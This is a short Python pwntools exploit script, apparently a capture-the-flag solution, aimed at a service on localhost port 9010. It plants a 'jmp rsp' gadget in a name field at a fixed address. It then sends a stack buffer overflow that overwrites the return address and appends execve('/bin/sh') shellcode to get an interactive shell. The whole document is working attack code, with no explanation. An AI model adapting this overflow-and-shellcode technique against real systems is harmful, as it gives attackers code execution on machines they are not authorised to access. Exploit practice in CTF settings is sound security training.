from pwn import *

ID = 0x6020A0 # id contains lowest 4 bytes of name

p = remote('localhost', 9010)

shellcode = 'jhH\xb8/bin///sPH\x89\xe71\xf6j;X\x99\x0f\x05'
code = '\xff\xe4' # jmpq *($rsp)

log.info('shellcode len: %d bytes' % len(code))

p.sendlineafter('name? : ', code)
p.sendlineafter('> ', '1')
p.sendlineafter('\n', 'a'*40 + p64(ID) + shellcode) # buf - 0xe930 / ret - e958

p.interactive()

